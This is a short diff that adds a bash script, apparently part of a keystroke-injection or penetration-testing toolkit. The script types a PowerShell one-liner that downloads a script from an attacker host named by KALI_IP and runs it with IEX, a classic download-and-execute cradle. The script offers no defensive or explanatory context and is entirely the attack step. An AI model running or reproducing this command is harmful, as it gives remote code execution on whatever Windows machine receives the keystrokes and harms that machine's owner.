@@ -1,0 +1,4 @@
+#!/bin/bash
+
+type_command "(new-object system.net.webclient).downloadstring('http://${KALI_IP}/b/run.txt') | IEX; "
+type_newline
